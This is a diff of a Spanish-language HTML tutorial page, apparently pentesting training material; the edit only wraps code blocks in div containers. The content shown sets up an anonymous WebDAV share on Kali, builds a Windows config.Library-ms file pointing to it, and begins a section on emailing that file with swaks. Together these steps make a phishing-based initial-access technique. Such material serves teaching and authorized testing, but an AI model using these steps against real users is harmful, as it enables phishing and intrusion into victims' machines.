@@ -235,17 +235,19 @@ shell.interactive()
                     <li><strong>--auth:</strong> Deshabilita la autenticación con <code>anonymous</code>.</li>
                     <li><strong>--root:</strong> Configura la raíz del directorio para el recurso compartido WebDAV.</li>
                 </ul>
-
+                <div class="code-block">
                 <pre><code>
 kali@kali:~$ mkdir /home/kali/webdav
 kali@kali:~$ touch /home/kali/webdav/test.txt
 kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
                 </code></pre>
                 <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+                </div>
 
                 <h3>Creando el Archivo de Biblioteca</h3>
                 <p>Usaremos Visual Studio Code para crear un archivo de biblioteca llamado <code>config.Library-ms</code>. Este archivo incluirá configuraciones XML específicas para apuntar al recurso compartido WebDAV.</p>
-
+                
+                <div class="code-block">
                 <pre><code>
 <?xml version="1.0" encoding="UTF-8"?>
 <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
@@ -268,7 +270,7 @@ kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anony
 </libraryDescription>
                 </code></pre>
                 <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
-
+                </div>
                 <h3>Enviando el Archivo al Correo</h3>
                 <p>Podemos enviar este archivo como adjunto utilizando la herramienta <code>swaks</code>:</p>
 
